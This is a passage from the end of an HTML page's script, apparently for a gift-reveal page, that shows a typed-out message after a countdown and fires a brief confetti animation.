                    msgContainer.appendChild(messageTextElement);
                    document.getElementById('giftContentRevealed').appendChild(msgContainer);
                    
                    // Start the effect after the container is visible
                    setTimeout(() => {
                        msgContainer.classList.add('show');
                        applyTypewriterEffect(messageTextElement, message);
                    }, 100);

                    triggerVictoryEffect();
                }, initialCount * 1000);

            }, { once: true });
        }

        function triggerVictoryEffect() {
            const victoryEffect = document.getElementById('victoryEffect');
            victoryEffect.style.display = 'block';
            for (let i = 0; i < 100; i++) {
                const confetti = document.createElement('div');
                confetti.className = 'confetti-piece';
                confetti.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
                confetti.style.left = `${Math.random() * 100}%`;
                confetti.style.animationDelay = `${Math.random() * 2}s`;
                victoryEffect.appendChild(confetti);
            }
            setTimeout(() => {
                victoryEffect.innerHTML = '';
                victoryEffect.style.display = 'none';
            }, 3000);
        }
    </script>
</body>
</html>




